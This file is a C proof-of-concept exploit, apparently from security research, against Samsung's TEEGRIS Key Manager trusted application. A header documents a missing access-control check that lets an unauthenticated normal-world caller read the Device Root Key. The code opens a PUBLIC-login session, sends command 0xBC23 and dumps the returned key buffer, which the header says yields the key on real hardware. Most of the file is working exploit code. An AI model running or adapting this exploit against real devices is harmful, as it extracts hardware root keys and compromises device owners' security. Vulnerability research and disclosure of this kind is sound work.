/*
 * skm (Samsung Key Manager, DEVROOT#SKM) — Device Root Key (DRK) exfiltration
 * via the missing-ACL (skm_invoke_acl_check return-0 stub) reaching the raw
 * HwVault DRK read handler.
 *
 * FINDING (headline): cmd 48163 / 0xBC23 -> skm_readDrkFromHwvault returns the
 *   raw Device Root Key to the REE on demand, and nothing stops a REE caller
 *   reaching it because skm_invoke_acl_check is compiled as a `return 0` stub.
 * SEVERITY: HIGH (DRK exfiltration) — the open-ACL precondition is flagged
 *   NEEDS-EXTERNAL-VERIFICATION (fac vs production build).
 *
 * CITATIONS (RE/samsung_teegris/skm.md):
 *   - cmd 48163/0xBC23 == skm_readDrkFromHwvault @0x1807C, "raw
 *     HwVaultHal_readCred(1, ...)"                               [skm.md:99]
 *   - "Returns the raw DRK to the REE on demand ... the most-direct DRK
 *     exfil primitive."                                          [skm.md:168]
 *   - skm_invoke_acl_check @0x1BA94 is "Currently `return 0;`" — "No prior
 *     caller authentication beyond skm_invoke_acl_check (which is a `return 0`
 *     stub on this build). Any REE component that can reach the TA can reach
 *     any cmd."                                              [skm.md:164,169]
 *   - DRK source: skm_readDrkFromHwvault reads credential id 1 from
 *     HwVaultHal_readCred (sub_25BB8) provided by VLTKPR.   [skm.md:152-158]
 *
 * WIRE (RE/samsung_teegris/skm.md:67-76):
 *   one MEMREF_INOUT in params[0], capacity bounded to 0x2000 bytes:
 *       [u32 cmd_id]
 *       [u32 payload_len]   // <= 0x2000
 *       [u8  payload[]]     // Samsung-TLV (sentinel 0xFE)
 *   "param_types low nibble must be 7; anything else returns -12002
 *    (Invalid param_types.)"                                     [skm.md:75]
 *   -> paramTypes = TEEC_PARAM_TYPES(MEMREF_TEMP_INOUT, NONE, NONE, NONE) = 0x7.
 *   The raw DRK read takes no TLV input, so payload_len = 0; the handler reads
 *   cred id 1 internally (skm.md:99,152) and writes the DRK material back into
 *   the same INOUT buffer, which we then DumpHex.
 *
 * TRIGGER: open a PUBLIC-login session (no creds), put [u32 0xBC23] at the head
 *   of an INOUT buffer, InvokeCommand(0xBC23), dump the returned buffer.
 *
 * GATE / REPRO-STATUS (RE/emulation/skm.md):
 *   The missing ACL (skm_invoke_acl_check == `return 0`) is CONFIRMED-IN-BINARY
 *   and is the reason ANY REE caller reaches this handler [emulation/skm.md:9-15].
 *   But the actual DRK read goes through the /dev/hwvault KERNEL driver, which
 *   the emulator does NOT model (no hwvault driver, no HWVAULT ROT, no device
 *   DRK) [emulation/skm.md:49,83-90]. So:
 *     REPRO-STATUS: DEVICE-ONLY.
 *   In the emulator the session opens and cmd 0xBC23 dispatches (proving the
 *   handler is reachable with no caller auth), but there is no DRK material to
 *   return — the exfil completes only on real hardware with a provisioned DRK.
 *
 * SECONDARY (LOW, static-only — NOT exercised here): RNG-fallback deterministic
 *   challenge in skm_verifyKeyPairConsistency @0x18C24 — on TEE_GenerateRandom
 *   returning != 32 bytes it signs the hardcoded literal
 *   "1234567890qwertyuiop[]asdfghjkl" with the DRK key [skm.md:201-215]. That
 *   lives on the RNG-*failure* branch, which the emulator's never-failing
 *   TEE_GenerateRandom cannot reach [emulation/skm.md:92-103] — documented,
 *   not triggered.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include "tee_client_api.h"
#include "repro.h"

TEEC_Result (*TEEC_OpenSession_impl)(TEEC_Context*, TEEC_Session*, const TEEC_UUID*,
                                     uint32_t, const void*, TEEC_Operation*, uint32_t*);
TEEC_Result (*TEEC_InitializeContext_impl)(const char*, TEEC_Context*);
void (*TEEC_FinalizeContext_impl)(TEEC_Context*);
void (*TEEC_CloseSession_impl)(TEEC_Session*);
TEEC_Result (*TEEC_InvokeCommand_impl)(TEEC_Session*, uint32_t, TEEC_Operation*, uint32_t*);
TEEC_Result (*TEEC_RegisterSharedMemory_impl)(TEEC_Context*, TEEC_SharedMemory*);

/* cmd 48163/0xBC23 -> skm_readDrkFromHwvault @0x1807C (skm.md:99). */
#define CMD_READ_DRK_FROM_HWVAULT  0xBC23u
/* INOUT request/response buffer; capacity bound is 0x2000 (skm.md:67). */
#define BUF_SZ                     0x2000

void cleanup_shm(){
#if EMULATE
    system("ipcrm -M 0x13337"); system("ipcrm -M 0x13338");
    system("ipcrm -M 0x13339"); system("ipcrm -M 0x1333a");
#endif
}

int main(void)
{
    char* ta = "00000000-0000-0000-0000-000000534b4d";   /* skm (ASCII tail SKM) */
    TEEC_UUID *uuid = teegris_uuid(ta);
    uint32_t err_origin;
    TEEC_Result res;
    TEEC_Context context;
    TEEC_Session session;
    TEEC_Operation op;

    cleanup_shm();
    load_functions();

    res = TEEC_InitializeContext_impl(NULL, &context);
    if (res != TEEC_SUCCESS) { printf("InitializeContext failed 0x%x\n", res); exit(-1); }

    /* PUBLIC login — no credentials. The DRK read is reachable regardless
     * because skm_invoke_acl_check @0x1BA94 is a `return 0` stub (skm.md:164,169). */
    res = TEEC_OpenSession_impl(&context, &session, uuid, TEEC_LOGIN_PUBLIC,
                               NULL, NULL, &err_origin);
    if (res != TEEC_SUCCESS) {
        printf("OpenSession failed 0x%x origin 0x%x\n", res, err_origin);
        TEEC_FinalizeContext_impl(&context); exit(-1);
    }
    printf("[*] session opened to skm with TEEC_LOGIN_PUBLIC (no creds)\n");

    /* Single INOUT buffer carrying the request header and receiving the DRK.
     * Wire (skm.md:67-76): [u32 cmd_id][u32 payload_len][u8 payload[]].
     * The raw DRK read needs no TLV input, so payload_len = 0. */
    uint8_t* io = (uint8_t*)allocate_param_mem(&context, BUF_SZ);
    if (!io) { printf("[*] alloc failed\n"); exit(-1); }
    memset(io, 0, BUF_SZ);
    *(uint32_t*)(io + 0) = CMD_READ_DRK_FROM_HWVAULT;   /* [u32 cmd_id]      */
    *(uint32_t*)(io + 4) = 0;                           /* [u32 payload_len] */

    /* param_types low nibble MUST be 7 (skm.md:75): one MEMREF_TEMP_INOUT in
     * params[0], the rest NONE -> paramTypes == 0x7. */
    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INOUT, TEEC_NONE,
                                     TEEC_NONE, TEEC_NONE);
    op.params[0].tmpref.buffer = io;
    op.params[0].tmpref.size   = BUF_SZ;

    printf("[*] invoking cmd 0x%X (skm_readDrkFromHwvault @0x1807C, raw HwVaultHal_readCred(1)) ...\n",
           CMD_READ_DRK_FROM_HWVAULT);
    res = TEEC_InvokeCommand_impl(&session, CMD_READ_DRK_FROM_HWVAULT, &op, &err_origin);
    printf("[*] readDrkFromHwvault returned 0x%x (%d) origin 0x%x\n",
           res, (int)res, err_origin);

    /* On a real device with a provisioned DRK this buffer now holds the DRK
     * material; in the emulator /dev/hwvault is un-modelled (REPRO-STATUS
     * DEVICE-ONLY, emulation/skm.md:83-90) so it stays zero. Dump it either way
     * to show the response edge. */
    printf("[*] response buffer (first 0x80 bytes):\n");
    DumpHex(io, 0x80, io);

    TEEC_CloseSession_impl(&session);
    TEEC_FinalizeContext_impl(&context);
    return 0;
}
